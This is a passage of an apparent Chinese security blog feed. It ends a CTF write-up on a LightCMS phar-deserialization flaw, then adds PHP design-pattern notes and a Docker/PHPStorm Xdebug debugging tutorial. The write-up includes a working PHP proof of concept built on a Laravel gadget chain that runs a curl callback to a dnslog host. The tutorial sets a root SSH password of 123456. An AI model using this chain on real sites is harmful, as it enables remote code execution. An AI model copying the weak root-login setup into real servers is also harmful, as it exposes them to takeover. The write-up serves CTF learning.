class="line">        <span class="keyword">case</span> <span class="keyword">$this</span>-&gt;isUrl():</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;initFromUrl(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个switch派生了这个漏洞需要利用的两个分支：phar反序列化的点 及 上传phar文件的点。</p><h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><p>进入 <code>case $this-&gt;isUrl()</code>分支，跟进 <code>$this-&gt;initFromUrl()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">initFromUrl</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line"><span class="comment">//!!重点方法!!</span></span><br><span class="line">    <span class="comment">//$url可控，为远程文件内容。若指定为一个phar文件即可触发反序列化</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span> = @file_get_contents(<span class="variable">$url</span>, <span class="literal">false</span>, <span class="variable">$context</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;initFromBinary(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//!!重点方法!!</span></span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="上传phar文件"><a href="#上传phar文件" class="headerlink" title="上传phar文件"></a>上传phar文件</h3><p>进入 <code>case $this-&gt;isBinary()</code>分支，跟进 <code>$this-&gt;initFromBinary()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">initFromBinary</span>(<span class="params"><span class="variable">$binary</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$resource</span> = @imagecreatefromstring(<span class="variable">$binary</span>);</span><br><span class="line">    <span class="variable">$image</span> = <span class="keyword">$this</span>-&gt;initFromGdResource(<span class="variable">$resource</span>);</span><br><span class="line">    <span class="comment">//获取文件MIME类型</span></span><br><span class="line">    <span class="comment">//CVE-2021-27112的补丁就是根据这里获取的文件头作为MIME类型来限制后缀，导致我们只能保存图片类型的后缀</span></span><br><span class="line">    <span class="comment">//不过文件后缀和文件头对phar文件没有影响，只要内容格式正确即可</span></span><br><span class="line">    <span class="variable">$image</span>-&gt;mime = finfo_buffer(finfo_open(FILEINFO_MIME_TYPE), <span class="variable">$binary</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$image</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>综上分析，我们可以得出这样一个利用链：<strong>首先上传一个文件头是图片类型的phar文件，phar文件内容为 phpggc 中laravel6.x的反序列化链。获取到phar文件上传路径后，然后再上传一个“URL文件”，内容为phar路径的文件。即可触发phar反序列化</strong></p><h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><p>按照正常逻辑，我们的POC如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//链子从phpggc扒拉下来的</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> \Illuminate\Bus\Dispatcher(<span class="variable">$function</span>); </span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="keyword">new</span> \Illuminate\Queue\CallQueuedClosure(<span class="variable">$parameter</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Queue</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CallQueuedClosure</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">connection</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = <span class="variable">$parameter</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">$o = new \Illuminate\Broadcasting\PendingBroadcast(&#x27;system&#x27;,&#x27;curl xxx1.8ogfme.dnslog.cn&#x27;);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="comment">//设置GIF文件头</span></span><br><span class="line">    <span class="variable">$phar</span> -&gt; setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$o</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">    rename(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用 xxd 查看文件结构：</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-4.png" width="600px"><p>请求如下：</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-3.png" width="800px"><p>然后。。。就报错了。。。由于下载远程图片时使用了 <code>imagecreatefromstring()</code>。而我们的 <em>phar.jpg</em> 不是一个正规的图片，导致该方法无法正常生成图片，遂报错。。。</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-2.png" width="800px"><p>解决办法也挺简单，只需要在文件中存在有 <code>&lt;?php __HALT_COMPILER(); ?&gt;</code> 即可。哪怕它位于文件的末尾也是可行的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">$o = new \Illuminate\Broadcasting\PendingBroadcast(&#x27;system&#x27;,&#x27;curl xxx1.8ogfme.dnslog.cn&#x27;);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="comment">//在文件头处放一个正常图片即可</span></span><br><span class="line"><span class="variable">$f</span> = file_get_contents(<span class="string">&quot;222222.png&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setStub(<span class="variable">$f</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$o</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">    rename(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序成功返回上传文件路径：</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-5.png" width="1000px"><p>根据文件路径构造 “URL文件” 的内容：</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-6.png" width="500px"><p>此时再次请求，成功执行命令：</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-7.png" width="800px">]]></content>
    
    
    <summary type="html">&lt;p&gt;昨天被我亲爱的小杰杰和师弟拉去玩耍了一波红帽杯。。来写下wp做个小记录。&lt;/p&gt;
&lt;p&gt;这次还是只解出来一题WEB2，，老废物了。。。。&lt;/p&gt;
&lt;p&gt;最近没咋更博客。。因为文章都发到安全客上混点零花钱用了。。。= =&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="WEB" scheme="http://example.com/categories/CTF/WEB/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="LightCMS" scheme="http://example.com/tags/LightCMS/"/>
    
    <category term="Yii2" scheme="http://example.com/tags/Yii2/"/>
    
  </entry>
  
  <entry>
    <title>PHP设计模式学习</title>
    <link href="http://example.com/2021/03/24/2021-03-24-php-design-patterns/"/>
    <id>http://example.com/2021/03/24/2021-03-24-php-design-patterns/</id>
    <published>2021-03-24T12:10:33.000Z</published>
    <updated>2021-03-24T15:27:19.236Z</updated>
    
    <content type="html"><![CDATA[<p>发现了这个写的好好，</p><p><a href="https://designpatternsphp.readthedocs.io/zh_CN/latest/README.html">https://designpatternsphp.readthedocs.io/zh_CN/latest/README.html</a></p><p>啧。。感觉没有再重复写的必要了。就简单在这里写写理解吧。以下都是较为简单的涉猎了下写的理解，可能有不对的地方。。</p><p>学习源码：</p><p><a href="https://github.com/DesignPatternsPHP/DesignPatternsPHP">https://github.com/DesignPatternsPHP/DesignPatternsPHP</a></p><span id="more"></span><br><h1 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h1><p><strong>个人理解：</strong></p><p>使用对应工厂类（Factory）实例化对应的内部类，基本上是一个工厂类对一个内部类，避免在外部直接实例化内部类。</p><p><strong>好处：</strong></p><p>使用工厂类实例化的时候，外部调用者不需要知道内部类实例化需要传什么参数，直接调用工厂类的特定方法即可。</p><br><h1 id="生成器模式"><a href="#生成器模式" class="headerlink" title="生成器模式"></a>生成器模式</h1><p><strong>个人理解：</strong></p><p>Interface Builder: 生成器接口，用于定义具有<strong>相同</strong>或<strong>类似</strong>功能的内部类要实现的方法。比如 数据库驱动类，数据库驱动有 mysql、oracle、mssql 等等，需要一一实现生成器接口。</p><p>暴露给外部类调用的就只有一个 <strong>导向器</strong>（Director），通过传入各个不同的类实例，来调用这些类的生成器方法，将一个 “空类” 包装好，设置好该设置的属性。</p><p><strong>好处：</strong></p><p>外部调用者直接向<strong>导向器</strong>传入实例即可得到对应类的 “完整版”。不需要外部调用着手动配置。</p><br><p>。。。。未完待续。。随缘更新。。。 = =</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;发现了这个写的好好，&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://designpatternsphp.readthedocs.io/zh_CN/latest/README.html&quot;&gt;https://designpatternsphp.readthedocs.io/zh_CN/latest/README.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;啧。。感觉没有再重复写的必要了。就简单在这里写写理解吧。以下都是较为简单的涉猎了下写的理解，可能有不对的地方。。&lt;/p&gt;
&lt;p&gt;学习源码：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/DesignPatternsPHP/DesignPatternsPHP&quot;&gt;https://github.com/DesignPatternsPHP/DesignPatternsPHP&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="http://example.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHPSTORM 调试 Docker内项目</title>
    <link href="http://example.com/2021/03/17/2021-03-17-phpstorm-docker/"/>
    <id>http://example.com/2021/03/17/2021-03-17-phpstorm-docker/</id>
    <published>2021-03-17T12:04:27.000Z</published>
    <updated>2021-03-24T15:33:56.028Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发在 Freebuf。但好像排版没那么好看 233.。。。于是想博客也发一份对照看看，个人感觉还是我这里的排版好看点哈哈哈</p><span id="more"></span><br><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在做一些CTF的审计题或者复现漏洞时，会得到 Docker 环境。需要我们在 Docker环境中进行代码调试。在 PHP 代码审计中，没有好的调试环境（如 xdebug这类调试工具），单单靠 var_dump 和 debug_print_backtrace 来手撕代码，效率十分低下。而要配好一个调试环境有时也是挺多坑的。俗话说“搭建环境两小时，漏洞复现两分钟”。本文就来简单说说如何使用 PHPSTORM 调试 Docker项目。</p><br><p>在开始之前，需要简单了解下 Docker。至少要会最基本的用法。不过由于主要是讲 PHPSTORM 调试的。所以 Docker介绍不会讲太多。若想了解更多的话建议看手册。</p><br><h1 id="Docker基本用法"><a href="#Docker基本用法" class="headerlink" title="Docker基本用法"></a>Docker基本用法</h1><p>首先要知道 Docker 最基本的两样东西：<strong>image</strong> 和 <strong>container</strong></p><p><strong>image</strong> 就是镜像，搭建一个 Docker 环境最基本的就是 image。可以<strong>简单理解</strong>为这就是创建虚拟机的那个镜像。</p><p><strong>container</strong> 就是容器。即 依据 image，创建出来的虚拟环境。可以<strong>简单理解</strong>为就是运行着的虚拟机</p><br><p>Docker 的配置文件为 Dockerfile。该文件内容为构建 container 的命令。基本命令有：</p><p><strong>FROM</strong> 设置 container 运行在哪个 image 上。必须写在 Dockerfile 的开头。可以在 <a href="https://hub.docker.com/">Docker Hub</a> 里找适合的 image。</p><p><strong>RUN</strong> 在 image <strong>build</strong> 时执行命令。一般用于安装环境</p><p><strong>CMD</strong> 在 container<strong>刚启动</strong>时执行命令。一般用于启动服务</p><p><strong>COPY</strong> 将宿主机的文件拷贝到 container中</p><p><strong>WORKDIR</strong> 设置工作目录。所有命令都会在这个目录的基础上进行工作</p><br><p>了解了上面的三个命令后，我们可以来简单写一个 Dockerfile了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">基础 image 为 php:7.3-apache</span></span><br><span class="line">FROM php:7.3-apache</span><br><span class="line"><span class="meta">#</span><span class="bash">安装 xdebug 扩展 并开启</span></span><br><span class="line">RUN pecl install xdebug &amp;&amp; \</span><br><span class="line">docker-php-ext-enable xdebug</span><br><span class="line"><span class="meta">#</span><span class="bash">将 宿主机的 phpinfo.php 拷贝到 container /var/www/html/phpinfo.php 中</span></span><br><span class="line">COPY ./phpinfo.php /var/www/html/phpinfo.php</span><br></pre></td></tr></table></figure><p>写完后在 Dockerfile 的目录里运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t test/testmyphp .</span><br></pre></td></tr></table></figure><p>等命令跑完，输入以下命令即可看到创建好的 image</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker image ls</span></span><br><span class="line">REPOSITORY                          TAG                  IMAGE ID            CREATED             SIZE</span><br><span class="line">test/testmyphp                      latest               4931b92274f2        56 seconds ago      413MB</span><br><span class="line">php                                 7.3-apache           b79d423ea1e9        2 months ago        411MB</span><br></pre></td></tr></table></figure><p>要想让 container 运行起来，使用如下命令。使用 <code>-p</code> 来指定映射端口，左边是宿舍机端口，右边是 container 端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 81:80 test/testmyphp</span><br></pre></td></tr></table></figure><p>查看运行中的 container</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker container ls</span></span><br><span class="line">CONTAINER ID        IMAGE              PORTS                ......</span><br><span class="line">10b8c28b2f69        test/testmyphp     0.0.0.0:81-&gt;80/tcp   ......</span><br></pre></td></tr></table></figure><p>进入 container 的  shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker <span class="built_in">exec</span> -it CONTAINER_ID值 bash</span></span><br><span class="line">root@10b8c28b2f69:/var/www/html# </span><br></pre></td></tr></table></figure><p>至此，基本的 Docker 环境我们就建好了。接下来研究下如何让 PHPSTORM 调试 Docker 项目</p><br><h1 id="调试方式一-Docker挂载调试"><a href="#调试方式一-Docker挂载调试" class="headerlink" title="调试方式一 - Docker挂载调试"></a>调试方式一 - Docker挂载调试</h1><p>这里做测试使用前文的 Dockerfile，需要按照实际情况进行配置添加。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">基础 image 为 php:7.3-apache</span></span><br><span class="line">FROM php:7.3-apache</span><br><span class="line"><span class="meta">#</span><span class="bash">安装 xdebug 扩展 并开启</span></span><br><span class="line">RUN pecl install xdebug &amp;&amp; \</span><br><span class="line">docker-php-ext-enable xdebug</span><br><span class="line"><span class="meta">#</span><span class="bash"> !!! 使用一个启动脚本来启动服务 !!!</span></span><br><span class="line">COPY ./start.sh /start.sh</span><br><span class="line">RUN chmod +x /start.sh</span><br><span class="line">CMD [&quot;/start.sh&quot;]</span><br></pre></td></tr></table></figure><p>start.sh 内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">配置 Xdebug</span></span><br><span class="line">echo &quot;xdebug.client_host = host.docker.internal&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.client_port = 9003&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.mode = debug&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.max_nesting_level = 1000&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.discover_client_host = true&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="meta">#</span><span class="bash">重启 apache ssh</span></span><br><span class="line">service apache2 restart</span><br></pre></td></tr></table></figure><p>重建 image：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">最好先删掉之前的再重建</span></span><br><span class="line">docker image rm IMAGE值 -f</span><br><span class="line">docker build -t test/testmyphp .</span><br></pre></td></tr></table></figure><p>重建完先不急着跑 container。先定位到我们的项目代码位置</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/15.png" width="500px"><p>使用 Docker 的 <em>Bind mounts</em> 技术。将宿主机的项目目录映射到 container 的网站目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 81:80 --mount type=bind,source=/home/xp/test_docker/test_program,target=/var/www/html test/testmyphp</span><br></pre></td></tr></table></figure><p>至此，调试环境所需要的服务就安装好了，接下来配置 PHPSTORM。</p><br><h2 id="配置-PHPSTORM"><a href="#配置-PHPSTORM" class="headerlink" title="配置 PHPSTORM"></a>配置 PHPSTORM</h2><p>直接使用 <code>Open</code> 打开项目</p><br><p><strong>配置 目录映射</strong></p><p>进入 <em>File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP -&gt; Servers</em>。配置目录映射</p><p>注意一定要把 <em>Use path mappings</em> 的勾勾上，才能配置目录映射</p><p><em>Absolute path on the server</em>  是要手动打上服务器路径的</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/8.png" width="800px"><p><strong>设置Xdebug端口</strong></p><p>进入 <em>File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP</em> -&gt; Debug。设置 <em>Xdebug Debug port</em> 为 9003。和 php 配置一致。</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/9.png" width="800px"><p><strong>配置一个 Run/Debug Configuration</strong></p><p>点击 PHPSTORM 右上角的 *Add Configuration….*。进入配置面，新增一个 PHP Web Page。并进行如下简单的配置即可（改名字设url 路径）</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/10.png" width="900px"><p><strong>启动 PHP Debug Listening</strong></p><p>直接点击 PHPSTROM 右上角的 <em>小电话</em> ，即可开启监听</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/11.png" width="500px"><p><strong>验证</strong></p><p>在 php文件上打上断点，点击 右上角 甲壳虫样式的 Debug按钮。即可成功断点</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/12.png" width="500px"><br><h1 id="调试方式二-ssh-隧道"><a href="#调试方式二-ssh-隧道" class="headerlink" title="调试方式二 - ssh 隧道"></a>调试方式二 - ssh 隧道</h1><p>这种方式不仅仅可以用在 <strong>Docker 环境</strong> 上，同样可以用在 <strong>远程服务器</strong> 上。缺点就是要在 container 里头安装许多额外服务。</p><br><h2 id="配置Dockerfile"><a href="#配置Dockerfile" class="headerlink" title="配置Dockerfile"></a>配置Dockerfile</h2><ol><li>安装ssh服务。 PHPSTORM需要 ssh 来进行目录映射，不然无法成功 Debug</li><li>安装 xdebug。这是调试的基础扩展组件</li><li>设置 ssh 允许 root 登陆。毕竟只是个 docker 调试环境，就不弄那么麻烦了。当然如果是线上业务啥的当然要做好权限分配。</li><li>修改 root密码。毕竟不知道密码也无法连接</li><li>启动 ssh 服务</li><li>重启 apache 服务</li></ol><p>这里做测试使用前文的 Dockerfile，需要按照实际情况进行配置添加。</p><p>修改前文的 Dockerfile。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">基础 image 为 php:7.3-apache</span></span><br><span class="line">FROM php:7.3-apache</span><br><span class="line"></span><br><span class="line">ENV APACHE_DOCUMENT_ROOT /var/www/html</span><br><span class="line"><span class="meta">#</span><span class="bash">安装 ssh 服务</span></span><br><span class="line">RUN apt-get update &amp;&amp; \</span><br><span class="line">apt-get install ssh -y</span><br><span class="line"><span class="meta">#</span><span class="bash">安装 xdebug 扩展 并开启</span></span><br><span class="line">RUN pecl install xdebug &amp;&amp; \</span><br><span class="line">docker-php-ext-enable xdebug</span><br><span class="line"><span class="meta">#</span><span class="bash">将宿主机的 phpinfo.php 拷贝到 container /var/www/html/phpinfo.php 中</span></span><br><span class="line">COPY ./phpinfo.php /var/www/html/phpinfo.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> !!! 使用一个启动脚本来完成流程 3 4 5 的工作 !!!</span></span><br><span class="line">COPY ./start.sh /start.sh</span><br><span class="line">RUN chmod +x /start.sh</span><br><span class="line">CMD [&quot;/start.sh&quot;]</span><br></pre></td></tr></table></figure><p>start.sh 内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">设置 ssh 允许 root 登录</span></span><br><span class="line">echo &#x27;PermitRootLogin yes&#x27; &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"><span class="meta">#</span><span class="bash">修改root密码</span></span><br><span class="line">echo root:123456 | chpasswd</span><br><span class="line"><span class="meta">#</span><span class="bash">配置 Xdebug。Xdebug 3 的配置如下，和 Xdebug 2不太一样</span></span><br><span class="line">echo &quot;xdebug.client_host = host.docker.internal&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.client_port = 9003&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.mode = debug&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.max_nesting_level = 1000&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.discover_client_host = true&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="meta">#</span><span class="bash">重启 apache ssh</span></span><br><span class="line">service apache2 restart</span><br><span class="line">service ssh restart</span><br><span class="line"><span class="meta">#</span><span class="bash">要加上这个，不然 container 运行完就停止了。</span></span><br><span class="line">sleep infinity</span><br></pre></td></tr></table></figure><p>重建 image：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">最好先删掉之前的再重建</span></span><br><span class="line">docker image rm IMAGE值 -f</span><br><span class="line">docker build -t test/testmyphp .</span><br></pre></td></tr></table></figure><p>启动 container：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run 